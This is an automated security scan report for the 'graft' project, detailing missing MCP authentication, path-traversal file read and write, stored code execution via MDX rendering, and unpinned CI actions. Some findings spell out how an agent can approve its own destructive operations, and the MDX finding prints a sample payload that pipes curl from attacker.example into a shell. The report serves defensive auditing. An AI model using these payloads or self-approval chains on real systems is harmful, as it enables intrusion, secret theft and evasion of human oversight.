# Vulnerability Scan Report

| Field | Value |
|-------|-------|
| Project | graft |
| Date | 2026-08-25T17:04:30.852Z |
| Files tracked | 127 |
| Files analyzed | 127 |
| Total findings | 61 |

## Summary

| Severity | Count |
|----------|-------|
| CRITICAL | 0 |
| HIGH | 10 |
| MEDIUM | 35 |
| HIGH_BUG | 1 |
| BUG | 14 |

## HIGH (10)

### MCP HTTP endpoint allows unauthenticated callers by default, exposing content writes, asset uploads, and approval decisions

- **File:** `examples/docs-site/src/pages/api/mcp.ts`
- **Recent committers:** AndersonDesign1 <josanderson25@gmail.com>
- **Lines:** 34, 40
- **Slug:** missing-auth
- **Confidence:** medium
- **Revalidation:** confirmed
- **Reasoning:** Verified: examples/docs-site/src/pages/api/mcp.ts line ~34 wires `requireActor: process.env.GRAFT_MCP_REQUIRE_AUTH === "1"`, which fails open when the env var is unset, handing anonymous actors the entire tool surface through createGraftMcpHandler (http.ts only rejects anonymous when requireActor is true). There is no compensating control: sdk-astro's graftRoute is a pure Request pass-through with no auth, neither app ships middleware (none found), and no runtime warning mirrors serve.ts's insecure-bind notice despite the file's own comment saying to set the variable 'for anything reachable from outside'. Impact is concrete, not hypothetical: write_content performs unauthenticated MDX authoring compiled into the live Postgres index (defacement/persistent writes); delete_content is defineFunction'd `public: true, destructive: true`, so an anonymous caller files an approval (requestedById NULL), approves it via decide_approval (isNull(requestedById) satisfied by the default 'mcp-operator'), and consumes it — full unauthenticated content destruction; list_approvals leaks pending function inputs and requester ids. HIGH is justified: the endpoint is explicitly built for external agents, and the fail-open default converts a configuration omission into full compromise.

`requireActor: process.env.GRAFT_MCP_REQUIRE_AUTH === "1"` (line 34) fails OPEN: without that env var, createGraftMcpHandler serves the full tool surface to anonymous actors. This Astro example is intended for external deployment (its comments say 'do that for anything reachable from outside'), but there is no runtime enforcement or warning — unlike graft serve/graft studio, whose insecure-bind warnings are the actual control. An unauthenticated attacker can call write_content (arbitrary MDX written into the checkout and compiled into the live Postgres index — content defacement), put_asset (arbitrary binary upload to S3), list_approvals (disclosure of pending approval inputs), and decide_approval (approve/deny pending approvals). With the common single-credential DATABASE_URL that retains UPDATE on approvals, this yields a complete unauthenticated self-approval loop against destructive functions, ending in anonymous data deletion.

**Recommendation:** Default requireActor to closed (reject anonymous) and require an explicit local-dev opt-out; add a runtime warning when the MCP mount lacks authentication; enforce the hardened runtime DB role so decideApproval cannot run under the serving credential.

---

### MCP HTTP endpoint allows unauthenticated callers by default, exposing content writes, asset uploads, and approval decisions

- **File:** `examples/landing-page/app/api/mcp/route.ts`
- **Recent committers:** AndersonDesign1 <josanderson25@gmail.com>
- **Lines:** 36, 42
- **Slug:** missing-auth
- **Confidence:** medium
- **Revalidation:** confirmed
- **Reasoning:** Verified: examples/landing-page/app/api/mcp/route.ts wires `requireActor: process.env.GRAFT_MCP_REQUIRE_AUTH === "1"` (flagged line 36/42 region) which fails open; http.ts then serves the anonymous actor every tool. Unlike graft serve/studio there is no warning or bind-host check anywhere on this path — only a code comment — and no Next.js middleware exists in the app to compensate, while the sibling routes confirm this app is built for Vercel deployment. The unauthenticated chain is fully constructible from verified code: (a) write_content authors arbitrary MDX and compiles it into the live Postgres index (defacement, persistent writes); (b) put_asset reads any process-readable file (e.g. .env) and returns a presigned GET URL to the caller (packages/assets/src/storage.ts); (c) list_approvals discloses pending function names and full input payloads; (d) decide_approval flips pending→approved with an attacker-chosen decidedBy (NULL requestedById rows pass via isNull). For gated functions like deleteSubmission the submissions:admin access rule blocks anonymous filing at the fn layer, but delete_content (public:true destructive) completes the anonymous request→approve→consume loop end-to-end. Same vulnerability class and mechanism as F4 but a different file/deployment — not a duplicate. HIGH stands.

`requireActor: process.env.GRAFT_MCP_REQUIRE_AUTH === "1"` (line 36) fails OPEN: unless the operator remembers to set the env var, `createGraftMcpHandler` resolves anonymous actors and serves them the full tool surface (packages/mcp/src/http.ts only rejects anonymous when requireActor is true). Unlike `graft serve`/`graft studio`, which emit runtime warnings when bound insecurely, this deployable-to-Vercel route (the sibling fn route reads VERCEL_GIT_COMMIT_SHA) has no runtime guardrail — only a code comment. On a deployed instance, an unauthenticated attacker over POST /api/mcp can invoke: (a) `write_content` — authors arbitrary MDX into the content tree and compiles it into the live Postgres index (content defacement, persistent DB writes); (b) `put_asset` — uploads arbitrary binaries to the project's S3 bucket; (c) `list_approvals` — discloses pending approvals including full input payloads; (d) `decide_approval` — approves/denies pending approvals. Because the default single-credential DATABASE_URL setup grants UPDATE on `approvals` unless the operator ran the optional role hardening, (d) completes a fully unauthenticated self-approval loop: request approval for the destructive `deleteSubmission` via POST /api/fn/deleteSubmission, approve it via MCP decide_approval, then consume it — anonymous destruction of operational data.

**Recommendation:** Fail closed: invert the default so anonymous MCP callers are rejected unless explicitly opted out for localhost (e.g. requireActor defaults based on bind host, or GRAFT_MCP_REQUIRE_AUTH unset => reject remote). Add a startup warning when the MCP route is mounted without auth, mirroring serve.ts/studio.ts. Document and enforce the hardened runtime DB role (runtimeRoleGrantsSql) so decide_approval is DB-blocked regardless.

---

### stdio MCP server hands connected agents a decide_approval tool with agent-supplied identity — two-call self-approval of destructive ops

- **File:** `packages/cli/src/commands/mcp.ts`
- **Recent committers:** AndersonDesign1 <josanderson25@gmail.com>
- **Lines:** 52, 56, 59, 79, 80
- **Slug:** acl-check
- **Confidence:** medium
- **Revalidation:** confirmed
- **Reasoning:** Confirmed end-to-end. mcp.ts wires createGraftMcp with actor: resolveActor and defaultAuthorization: devToken, but those only affect run_function/delete_content via invokeFunction; the registered decide_approval tool (server.ts ~L941-985) calls decideApproval directly with decidedBy?.trim() || 'mcp-operator' and never consults an actor. Attack: (1) agent calls delete_content/run_function for a destructive op — invokeFunction stamps Bearer <devToken>, the handler resolves {kind:'agent', id:'graft-cli'}, and the approval row gets requestedById='graft-cli' (or NULL when GRAFT_DEV_TOKEN is unset); (2) agent calls decide_approval — the default decidedBy 'mcp-operator' differs from 'graft-cli', so the WHERE clause or(isNull(requestedById), ne(requestedById, decidedBy)) passes and the process's own DB credential flips pending→approved; (3) retry with approval:<id> consumes it. No human ever decides. The design note (approval-hardening.md) explicitly assumed 'no approve surface exists over MCP/HTTP; decideApproval is CLI-only' — the shipped code contradicts that premise, and even the tool's own description ('Requires an owner DB role... The requester cannot decide their own approval') is defeated because the agent rides the server's owner credential and picks a different decidedBy string. The only durable mitigation is the opt-in graft harden runtime role (no UPDATE on approvals); out-of-the-box DATABASE_URL is the owner credential, so threat-model items 1 and 3 both apply. HIGH stands.

mcpCommand wires the MCP server with the dev-token actor resolver and defaultAuthorization: devToken (L79-80). Through this server, an agent files a destructive-op approval via run_function/delete_content as requestedById "graft-cli" (the dev-token identity), then calls the shipped decide_approval tool (packages/mcp/src/server.ts ~L941-985) — a direct decideApproval() call with NO actor/scope check — passing decidedBy defaulted to "mcp-operator". Since "mcp-operator" !== "graft-cli", the APPROVAL_SELF_DECISION separation-of-duties WHERE clause passes, and the agent approves its own destructive operation without any human. The only durable mitigation is the opt-in hardened runtime DB role (no UPDATE on approvals via hardenRuntimeRole); out of the box DATABASE_URL is the owner credential, so the gate advertised as holding 'against the agent itself, not just accidents' is bypassable by the very agent it gates. This matches threat-model items 1 and 3 (a caller reaching decideApproval while skipping the human gate).

**Recommendation:** Remove decide_approval from the stdio/project MCP server (keep it CLI/Studio-only), or bind it to an authenticated operator identity that cannot equal the requester (derive decidedBy from verified actor identity, never a tool argument), and refuse the tool unless the process is running under a role that is demonstrably operator-scoped.

---

### Studio authorize callback admits ANY authenticated actor (including agents) to operator-only endpoints

- **File:** `packages/cli/src/commands/serve.ts`
- **Recent committers:** AndersonDesign1 <josanderson25@gmail.com>
- **Lines:** 276, 277, 278, 279, 280, 281, 285, 292
- **Slug:** acl-check
- **Confidence:** high
- **Revalidation:** confirmed
- **Reasoning:** Verified at serve.ts L276-285: when bound beyond loopback with devToken or issuers configured, authorize resolves the bearer and returns true for ANY actor whose kind !== 'anonymous'. Both identity sources mint agent-kind actors here: GRAFT_DEV_TOKEN maps to {kind:'agent', id:'graft-serve'} (L217) and TrustedIssuer.actorKind defaults to 'agent' (oidc.ts). No requireScopes, no kind==='human' check anywhere in this path (grep confirms the only kind !== 'anonymous' gate in the repo is this callback). Behind that callback, createStudioApiHandler exposes POST /api/studio/v1/approvals/:id/decide (decideApproval), PUT /document (writes MDX files), /changes/commit, /compilations/:id/revert, and /compile. So an autonomous agent holding its normal runtime token reaches the operator decision surface over HTTP, contradicting the documented invariant 'decideApproval — operator-only' and threat-model items 1/3. Combined with F4's body-supplied decidedBy, self-approval is complete. Opt-in --studio mounting tempers reach slightly but does not mitigate once enabled; HIGH is correct.

When graft serve binds beyond loopback with a dev token or trusted issuers, the Studio authorize callback (L276-283) returns true for any actor whose kind !== "anonymous" — including agents minted from GRAFT_DEV_TOKEN ({kind:"agent", id:"graft-serve"}) or OIDC tokens (default actorKind "agent"). No scope or human-kind check is applied (requireScopes is never used here). The Studio API mounted behind this callback exposes operator-only operations: POST /api/studio/v1/approvals/:id/decide (decideApproval), PUT /api/studio/v1/document (writes MDX files), POST /changes/commit, compilations/:id/revert, and POST /compile (packages/studio/src/api.ts). An autonomous agent holding any valid bearer token therefore reaches the human-decision surface over HTTP, violating the documented invariant 'decideApproval — operator-only (CLI / Studio / MCP)' and threat model items 1 and 3. Combined with the client-controlled decidedBy field (see separate finding), an agent can approve its own destructive operations entirely through this endpoint.

**Recommendation:** Restrict the Studio authorize callback to operator identities only — e.g. require actor.kind === "human", or a dedicated operator scope (requireScopes("studio:operator")) — rather than any non-anonymous actor. Do not share the agent dev-token/OIDC trust config between the function/MCP surfaces and the Studio decision surface.

---

### Anonymous MCP callers can decide approvals; configuring identity silences the bind warning without enabling enforcement

- **File:** `packages/cli/src/commands/serve.ts`
- **Recent committers:** AndersonDesign1 <josanderson25@gmail.com>
- **Lines:** 202, 217, 226, 265, 266
- **Slug:** missing-auth
- **Confidence:** high
- **Revalidation:** confirmed
- **Reasoning:** Verified: requireMcpActor = process.env.GRAFT_MCP_REQUIRE_AUTH === '1' (L202) — off unless explicitly set (the Docker entrypoint sets it for containers, but bare `graft serve --host 0.0.0.0`, the documented headless topology, does not). In http.ts, resolveActor returning ANONYMOUS (no Authorization header) passes when requireActor is falsy; createGraftMcp then registers list_approvals and decide_approval unconditionally with no per-tool actor/scope/access checks. An unauthenticated remote attacker can therefore JSON-RPC tools/call decide_approval — the UPDATE runs under whatever credential DATABASE_URL holds (owner out-of-the-box), so runtime-role hardening of direct SQL is irrelevant to this path — then replay run_function/delete_content with the approval id: a zero-credential human-gate bypass. The warning-logic gap is also real: L266 treats issuers.length > 0 || devToken as sufficient to skip the bind warning, but those only configure the resolver, not enforcement — setting GRAFT_DEV_TOKEN silences the warning while anonymous decide_approval stays open. Even with requireActor on, authenticated agents would still reach the tool (that facet overlaps F1), but the finding's core claim about anonymous reachability and misleading warning suppression is accurate. HIGH.

The MCP handler is mounted with requireActor: requireMcpActor (L226), which defaults to false (GRAFT_MCP_REQUIRE_AUTH !== "1", L202). Inside createGraftMcpHandler, requireActor is the ONLY gate; tools like list_approvals and decide_approval call listPendingApprovals/decideApproval directly with no per-tool actor or access check (packages/mcp/src/server.ts ~L911-985). So on any deployment bound beyond loopback without GRAFT_MCP_REQUIRE_AUTH=1, an unauthenticated remote attacker can: (1) list pending approvals, (2) call decide_approval with decision "approved" (the server's own DB credential performs the UPDATE, so the runtime-role hardening that protects direct SQL does not apply to this path), and (3) retry the destructive run_function with the x-graft-approval header — a complete human-gate bypass with zero credentials. There is also a subtle logic gap: the warning condition (L266) treats `issuers.length > 0 || devToken` as sufficient, but those only configure the resolver — they do NOT enable requireActor. An operator who sets GRAFT_DEV_TOKEN before binding publicly receives NO warning, yet anonymous decide_approval remains fully reachable.

**Recommendation:** Default GRAFT_MCP_REQUIRE_AUTH to on whenever the host is not loopback, and make the warning condition test actual enforcement (!requireMcpActor) rather than resolver configuration. Additionally, remove decide_approval from the network-reachable MCP surface or gate it behind an explicit operator credential/scope so agents and anonymous callers cannot reach it.

---

### MCP decide_approval trusts a caller-supplied decider identity, letting the requester self-approve destructive operations

- **File:** `packages/mcp/src/server.ts`
- **Recent committers:** AndersonDesign1 <josanderson25@gmail.com>
- **Lines:** 940, 947, 948, 950, 953, 955, 962
- **Slug:** auth-bypass
- **Confidence:** high
- **Revalidation:** confirmed
- **Reasoning:** Verified end-to-end. server.ts's decide_approval tool (lines 940-977) accepts an optional caller-supplied `decidedBy` string (default 'mcp-operator'), resolves NO actor identity, and passes it straight into decideApproval(). In packages/db/src/approvals.ts the entire separation-of-duties control is the UPDATE predicate `or(isNull(approvals.requestedById), ne(approvals.requestedById, decidedBy))` — a comparison between a stored id and an attacker-chosen string. functions-handler.ts stamps `requestedById: actor.id ?? null`, so an agent that files an approval under its own id defeats the check by supplying any other label, and an anonymous requester (NULL) is approved by the default value alone via the isNull branch. The consume step (graft_consume_approval, migration 0007) checks only status/function/inputCanonical, never requester-vs-consumer, so once approved the retry executes. The claimed DB-role backstop does not hold on any shipped surface: `graft mcp` builds its handle from createDb(requireDatabaseUrl()) (commands/mcp.ts), `graft serve` passes branch.db from createDb(url) into createGraftMcpHandler (commands/serve.ts), and both examples pass createDb(DATABASE_URL) — all owner credentials with UPDATE on approvals, making the decided_role stamp identical on both sides of the gate. Concrete chain: run_function/delete_content (files 403 with approval id) → decide_approval {id, decision:'approved', decidedBy:'x'} → retry with approval id. This is precisely threat-model item #1 realized at the application layer.

The decide_approval tool takes `decidedBy` as a free-text, optional tool argument (defaulting to the literal string "mcp-operator") and passes it straight to decideApproval() (packages/db/src/approvals.ts). The ONLY separation-of-duties control is the SQL predicate `or(isNull(approvals.requestedById), ne(approvals.requestedById, decidedBy))` — i.e., the 'human' is identified by an attacker-chosen string, not by any authenticated identity. Attack scenario (exactly threat-model item #1): (1) an agent calls a destructive function or delete_content, filing an approval whose requestedById is its actor id (or NULL for an anonymous/defaultAuthorization-less server); (2) the same agent calls decide_approval { id, decision: "approved", decidedBy: "any-string-other-than-my-id" } — the WHERE clause passes and the approval flips to approved; (3) the agent retries the call with the approval id and the destructive operation executes. When the approval was requested by an anonymous actor (requestedById NULL), even the default "mcp-operator" value satisfies isNull(requestedById) and approves it outright. Both deployment surfaces that expose this tool run on the owner-role DATABASE_URL connection — `graft mcp` builds its db via createDb(requireDatabaseUrl()) and `graft serve` passes branch.db to createGraftMcpHandler — so the documented control 'runtime DB role must not UPDATE approvals' does not protect them. On `graft serve` with GRAFT_MCP_REQUIRE_AUTH off (the default), the entire file→approve→consume loop is reachable unauthenticated over HTTP. The APPROVAL_SELF_DECISION guard is therefore cosmetic: the DB-stamped decided_role records the same owner role on both sides of the gate.

**Recommendation:** Bind the decider identity to the resolved actor, not to user input: resolve the caller via the configured actor resolver (as run_function does), reject anonymous deciders, and derive decidedBy from actor.kind/actor.id instead of accepting a `decidedBy` tool argument. Additionally, consider requiring the deciding request to carry a distinct operator credential/scope (e.g. a scope the agent runtime tokens never receive), and treat requestedById IS NULL rows as undecidable from MCP.

---

### put_asset reads any file on the server via unrestricted `path` and exposes its contents at a retrievable URL

- **File:** `packages/mcp/src/server.ts`
- **Recent committers:** AndersonDesign1 <josanderson25@gmail.com>
- **Lines:** 740, 777, 785, 786, 830, 833
- **Slug:** path-traversal
- **Confidence:** high
- **Revalidation:** confirmed
- **Reasoning:** Confirmed in source. put_asset passes the raw `path` argument to node:fs readFileSync(path) (server.ts line 785) with no resolution, containment within contentDir, symlink check, or allowlist — the tool description's 'local/stdio agents' caveat is documentation, not enforcement, and the exact same server object is served remotely by createGraftMcpHandler. The read bytes are stored under an attacker-chosen key validated only against ASSET_KEY_RE (which makes `..` unrepresentable in the destination, confirming the flaw is exclusively the read source), and the tool response includes `url: await storage.url(key)` (line 839). Per packages/assets/src/storage.ts, url() returns either a stable publicBaseUrl URL or a presigned GET signed with the server's credentials (default X-Amz-Expires=900), i.e., directly fetchable by the calling agent. Concrete attack on any HTTP-mounted surface (examples default to anonymous since requireActor is unset): tools/call put_asset {path: '/proc/self/environ' or '<repo>/.env', key: 'assets/x.png'} → fetch the returned presigned URL → exfiltrate DATABASE_URL, GRAFT_DEV_TOKEN, S3 keys, and any process-readable file. Even where the operator never intended remote exposure, a prompt-injected agent on a stdio server can stage host files into the bucket. High confidence and high severity.

The put_asset tool accepts a `path` argument and passes it directly to readFileSync(path) with no validation, containment within contentDir, or allowlist — despite the tool description claiming it is for 'a file on the machine running this MCP server (local/stdio agents)'. The read bytes are uploaded to the S3-compatible asset store under an attacker-chosen key and the tool response includes `url: await storage.url(key)`, which per packages/assets/src/storage.ts is either a stable public URL (when publicBaseUrl is set) or a presigned GET URL (default 900s expiry) — i.e., directly fetchable by the calling agent. Attack scenario: a remote agent connected to the HTTP MCP surface (mounted at /api/mcp by graft serve, anonymous by default since requireActor is opt-in) calls put_asset { path: "/srv/app/.env", key: "assets/x.png" } and receives a presigned URL to the project's .env — leaking DATABASE_URL, GRAFT_DEV_TOKEN, NEON_API_KEY, and any other secrets — then reads it. Any file readable by the MCP process (SSH keys, source code, credentials of sibling services) is exfiltratable the same way. Even on loopback stdio servers, a prompt-injected agent can use this to stage arbitrary host files into the asset bucket. The key used for storage is validated (ASSET_KEY_RE, `..` unrepresentable), so the flaw is purely the unrestricted read source, not the destination.

**Recommendation:** Restrict `path` to the project tree: resolve it and require the result to be inside contentDir (or another configured allowlist root), rejecting symlinks that escape it. Better: remove the `path` option entirely from servers created via createGraftMcpHandler (remote surfaces) and keep it only behind an explicit local-only flag for `graft mcp` stdio.

---

### MdxBody executes stored content as arbitrary JavaScript in the Node process (stored RCE via content writes)

- **File:** `packages/sdk-next/src/mdx.tsx`
- **Recent committers:** AndersonDesign1 <josanderson25@gmail.com>
- **Lines:** 31, 38, 48, 52
- **Slug:** rce
- **Confidence:** medium
- **Revalidation:** confirmed
- **Reasoning:** Verified the sink and the sources. MdxBody compiles the stored body with @mdx-js/mdx compile({outputFormat:'function-body'}) and executes it via run({...runtime, baseUrl}) (mdx.tsx L31-52) — run evaluates the compiled function-body via new Function in-process, with no sandbox, no expression/import restriction, and no sanitize plugin anywhere in the pipeline (grep across compiler/studio/sdk-next confirms); MDX expressions and import() therefore execute arbitrary Node-side JS with process access. The source flows unmodified from content_index rows/disk into rendering — examples/landing-page/components/page.tsx L30 and app/products/page.tsx L42 pass doc.body directly, and README/design docs position MdxBody as the standard React render path. The write side of the trust boundary is genuinely porous in this codebase: MCP write_content has NO scope or actor check (guarded() is only error translation), HTTP MCP may run anonymous when GRAFT_MCP_REQUIRE_AUTH is off, Studio PUT /document is unauthenticated on loopback and gated only by F1's binary check remotely, and content writes are not approval-gated — while the project's own threat model treats autonomous agents as semi-trusted authors requiring human gates precisely for high-impact actions. Stored JS execution on the render host is strictly more powerful than any destructive op the approval system protects, so the privilege escalation crosses a documented boundary rather than reflecting intended MDX power for trusted operators alone. One could argue CRITICAL, but HIGH as filed is reasonable.

MdxBody compiles the stored MDX body with @mdx-js/mdx `compile()` and executes it via `run()`, which evaluates the compiled function-body inside `new Function` in the host Node runtime. Nothing restricts what the evaluated code can do: MDX expressions ({...}) execute arbitrary JavaScript with access to globals (process, globalThis.fetch, dynamic import()), and there is no rehype-sanitize, expression filtering, import allowlist, or VM sandboxing anywhere in the pipeline (verified across packages/compiler and packages/studio). The source string comes straight from content_index rows / on-disk .mdx files (e.g. examples/landing-page/components/page.tsx passes doc.body directly). Any actor with content-write capability can therefore achieve server-side code execution on the consuming app's production server the first time the page renders: (a) an autonomous agent writing documents via MCP functions — precisely threat #1/#3 in the project's own threat model, since this bypasses scopes, audit, and the destructive-op human gate that define Graft's security posture; (b) any unauthenticated caller of PUT /api/studio/v1/document when createStudioApiHandler is mounted without an `authorize` callback (the check is optional: `if (options.authorize)`); (c) anyone holding the runtime DB credential. Example payload body: `{await import("node:child_process").then(m => m.execSync("curl https://attacker.example|sh"))} {0}`. This escalates a 'content author' privilege to full host RCE, crossing the trust boundary the approval system exists to enforce.

**Recommendation:** Do not evaluate authored bodies as unconstrained JavaScript. Options: compile with restrictions that reject raw JS expressions/imports for non-operator content (custom remark/rehype pass or MDX `remark-mdx-disable-expressions`), render untrusted bodies with a safe Markdown renderer instead of MDX, or isolate evaluation in a restricted sandbox (worker/VM with no process/net access) and reserve full-MDX rendering for operator-signed content only. Additionally, make the Studio `authorize` callback mandatory (fail closed) so content writes cannot be unauthenticated.

---

### Operator-only Studio actions reachable by agent-kind actors, enabling self-approval of destructive operations

- **File:** `packages/studio/src/api.ts`
- **Recent committers:** AndersonDesign1 <josanderson25@gmail.com>
- **Lines:** 374, 375, 376, 386, 540, 551, 555
- **Slug:** acl-check
- **Confidence:** high
- **Revalidation:** confirmed
- **Reasoning:** Verified end-to-end. In cli/src/commands/serve.ts the Studio authorize callback is wired as `actor.kind !== "anonymous"` when bound off loopback with a dev token or issuers, so ANY authenticated principal passes — GRAFT_DEV_TOKEN maps to `{ kind: "agent", id: "graft-serve", scopes }` (serve.ts L196-199) and OIDC tokens verify into kind:"agent" actors by default (auth.test.ts L99-107). The decide route (api.ts L540-568) sits behind only this gate and stamps decidedBy from the server-fixed default 'studio-serve' (`decidedBy: "studio-serve"` in startServe) or client input. packages/db/src/approvals.ts L143-151 enforces separation of duties solely by comparing requestedById != decidedBy inside the UPDATE's WHERE clause; approvals filed via POST /api/fn record requestedById = actor.id = 'graft-serve' (functions-handler.ts L323), which differs from 'studio-serve', so the guard passes and the agent approves its own destructive request with no human involved. On loopback mounts authorize is undefined entirely, making the endpoint unauthenticated locally. I also confirmed the DB-role backstop is not active by default: resolveBranchHandle returns controlDb built from the single owner DATABASE_URL for overlay branches (db/src/branch.ts), and hardenRuntimeRole is only applied by the opt-in `graft harden` command — grep shows no caller in serve/studio paths. Full chain: agent requests destructive fn (403 + approval id) → POST /api/studio/v1/approvals/<id>/decide {"decision":"approved"} → retry with x-graft-approval header → consume succeeds. Real and exploitable.

The Studio API's only authorization is a binary 'authenticated or not' callback (api.ts L374-386). When mounted by `graft serve --studio`, that callback is wired as `actor.kind !== "anonymous"` (cli/src/commands/serve.ts L278-281), which accepts ANY authenticated principal — including kind:"agent" actors, which is exactly what GRAFT_DEV_TOKEN maps to (serve.ts L198: `{ kind: "agent", id: "graft-serve", scopes }`) and what OIDC issuers authenticate by default (packages/auth/src/oidc.ts). Behind this gate sit operator-only operations: POST /api/studio/v1/approvals/{id}/decide (L540-568), compilation revert (L575+), changes/commit, document PUT, and compile. Critically, the approval decision path defeats the human gate for destructive functions: decideApproval()'s separation-of-duties guard compares requestedById vs decidedBy (packages/db/src/approvals.ts L143-151), but the Studio stamps decidedBy from a server-fixed default ('studio-serve') or client input — never the caller's actor identity. An autonomous agent holding only GRAFT_DEV_TOKEN can therefore request a destructive function call (requester id 'graft-serve'), then POST /api/studio/v1/approvals/<id>/decide {"decision":"approved"}; decidedBy ('studio-serve') differs from the requester, so the guard passes and the agent approves its own destructive operation with no human involved. This directly contradicts the project threat model ('decideApproval — operator-only', 'destructive: true is always human-gated') and matches the project-specific anti-pattern 'an access rule that treats actor.kind === agent as trusted'. The DB-role split is the intended backstop, but serve.ts wires branch.db from the single DATABASE_URL with no hardened runtime role, so in the default deployment the UPDATE succeeds.

**Recommendation:** Restrict the Studio authorize callback to operator identities (e.g. actor.kind === "human" or a dedicated studio scope), not merely 'non-anonymous'; stamp decidedBy from the verified caller identity server-side rather than a constant or client-supplied string so the requester!=decider check is meaningful.

---

### Arbitrary file write outside the content directory via unvalidated slug on PUT /api/studio/v1/document

- **File:** `packages/studio/src/api.ts`
- **Recent committers:** AndersonDesign1 <josanderson25@gmail.com>
- **Lines:** 650, 659, 680, 686
- **Slug:** path-traversal
- **Confidence:** high
- **Revalidation:** confirmed
- **Reasoning:** Confirmed arbitrary write. The PUT /api/studio/v1/document handler validates only non-empty collection/slug (api.ts L659-664) and forwards to writeDocument(), which builds `sourcePath = ${collection}/${slug}.mdx` and `fullPath = join(contentDir, ...sourcePath.split("/"))` (content.ts L101-103) with no safeContentPath()/containment call anywhere in the flow — unlike git.ts's diff/commit paths, which do confine. A slug like '../../../../tmp/pwn' collapses under join() to a path outside the content root, and writeDocumentFile() (compiler/src/serialize.ts L31-36) does mkdirSync(recursive) + writeFileSync. The pre-write parseDocument() check does not save it: the SLUG_RE kebab-case validation (compiler/src/parse.ts L60-70) applies to the slug derived from frontmatter or basename(sourcePath) — basename strips all '..' segments ('pwn' passes) — and is entirely decoupled from the path actually written; there is no MCP-style frontmatter-slug-vs-path-slug conflict check here either (verified server.ts L665-670 has one; studio's writeDocument does not). Attacker data just needs to satisfy the collection's Zod schema, which they control. Reachability: unauthenticated on loopback mounts (authorize undefined per serve.ts/studio.ts) and any non-anonymous actor on hosted serve --studio per F1. True positive, HIGH is appropriate.

The PUT /document handler validates only that payload.collection and payload.slug are non-empty (L659-664) and forwards them to writeDocument(), which builds the target path as `${collection}/${slug}.mdx` joined onto contentDir (packages/studio/src/content.ts L101-103): `join(contentDir, ...sourcePath.split("/"))`. Unlike every git-facing path in this package, no safeContentPath()/containment check is applied, so a slug like `../../../../tmp/evil` or `../../src/payload` resolves outside the content root; writeDocumentFile() then does mkdirSync(dirname, {recursive:true}) + writeFileSync — an arbitrary file write (forced .mdx extension) anywhere the process can write, plus arbitrary directory creation. The only slug validation in the codebase (SLUG_RE kebab-case check, packages/compiler/src/parse.ts L60-70) does not stop this: parseDocument derives the checked slug via basename(sourcePath), which strips all traversal segments ('pwn.mdx' -> 'pwn' passes), and in the Studio flow the frontmatter `slug` field comes from attacker-controlled payload.data with no consistency check against the path slug (unlike MCP write_content's conflict check). Any caller able to reach this endpoint (loopback callers, any authenticated actor on hosted deployments per the acl finding, or local malware) gains a write primitive outside the sanctioned content tree — e.g. overwriting other .mdx sources in the monorepo or planting files that a later build step consumes.

**Recommendation:** Run payload.slug (and collection) through the existing safeContentPath()-style containment check plus SLUG_RE validation BEFORE constructing the path in writeDocument(); reject slugs containing '/', '\\', '..' or anything outside ^[a-z0-9-]+$.

---

## MEDIUM (35)

### GitHub Actions pinned to mutable major tags instead of commit SHAs

- **File:** `.github/workflows/ci.yml`
- **Recent committers:** AndersonDesign1 <josanderson25@gmail.com>
- **Lines:** 18, 21, 24
- **Slug:** other-supply-chain-unpinned-actions
- **Confidence:** low
- **Revalidation:** confirmed
- **Reasoning:** Verified verbatim: ci.yml references actions/checkout@v7 (L18), pnpm/action-setup@v6 (L21), actions/setup-node@v7 (L24) — all mutable major tags with zero tamper-evidence, so a tag-move compromise (the tj-actions/changed-files technique) would execute attacker code on every push and pull_request. There is no mitigation in the repo: no SHA pinning, no permissions block (so GITHUB_TOKEN uses repo defaults, potentially read/write on pushes), no third-party action allowlist. The exploit is conditional on an upstream compromise, but that precondition is inherent to the vulnerability class — the whole point of SHA pinning is to remove trust in upstream tag mutability. Impact is genuinely bounded as the finding itself states: the workflow uses no secrets (BETTER_AUTH_SECRET is a build-only throwaway), runs no deploys, and fork PRs get a read-only token, leaving cache/artifact poisoning and source exfiltration as the realistic blast radius. That keeps this at MEDIUM rather than higher; it is a real hardening gap, not a false positive.

All three actions are referenced by mutable major-tag refs: actions/checkout@v7 (L18), pnpm/action-setup@v6 (L21), actions/setup-node@v7 (L24). If any upstream repo/tag were compromised and the tag moved (the technique behind the tj-actions/changed-files supply-chain incident), arbitrary attacker code would execute in CI on every push to main/feat/core and every pull_request. Impact here is bounded — ci.yml declares no permissions block and uses no secrets, so exposure is limited to the default GITHUB_TOKEN and runner access — but pnpm/action-setup is third-party (pnpm org) and the pattern provides no tamper-evidence.

**Recommendation:** Pin each action to a full-length commit SHA (e.g. actions/checkout@<sha>) with a version comment. Optionally restrict third-party actions via repository Actions allowlist policy.

---

### Release workflow with id-token/contents write permissions runs unpinned third-party actions

- **File:** `.github/workflows/release.yml`
- **Recent committers:** AndersonDesign1 <josanderson25@gmail.com>
- **Lines:** 52, 63, 73, 87
- **Slug:** other-supply-chain-unpinned-actions
- **Confidence:** medium
- **Revalidation:** confirmed
- **Reasoning:** Confirmed at the exact cited lines: checkout@v7 (L52), pnpm/action-setup@v6 (L63), setup-node@v7 (L73), changesets/action@v1 (L87), under job-level permissions contents:write, pull-requests:write, id-token:write (L25-28) with NPM_CONFIG_PROVENANCE publishing. A compromise that moves any of these tags — two of which are third-party (pnpm org, changesets org) — runs attacker code inside a job capable of minting npm trusted-publishing OIDC tokens and publishing attacker-controlled @usegraft/* tarballs to every downstream consumer, the highest-consequence outcome available in this repo. Unlike ci.yml there are real credentials here (id-token:write is precisely what the publish flow validates), so the missing pinning directly undermines the workflow's otherwise careful threat model (the file documents pnpm#11513 and registry-url hazards in detail, yet leaves refs mutable). Exploitation still requires an upstream compromise as a precondition, which is why MEDIUM rather than HIGH is appropriate; SHA pinning is the standard control and its absence is verified.

The release workflow grants contents: write, pull-requests: write, and id-token: write (L25-28), then executes four actions referenced by mutable major tags: actions/checkout@v7 (L52), pnpm/action-setup@v6 (L63), actions/setup-node@v7 (L73), and changesets/action@v1 (L87). Two of these are third-party (pnpm org, changesets org). A tag-move compromise of either would run attacker code inside a job that can mint npm trusted-publishing OIDC tokens (NPM_CONFIG_PROVENANCE flow, L28/L36) and publish attacker-controlled versions of every @usegraft/* package — compromising all downstream consumers. Exploitation requires an upstream compromise as a precondition, which is exactly what SHA pinning defends against; the workflow's own comments demonstrate careful threat modeling elsewhere, making the missing pinning notable. Minor related hardening: id-token: write is scoped to the whole job while only the publish step needs it; splitting version/publish into separate jobs with distinct permission sets would reduce standing privilege.

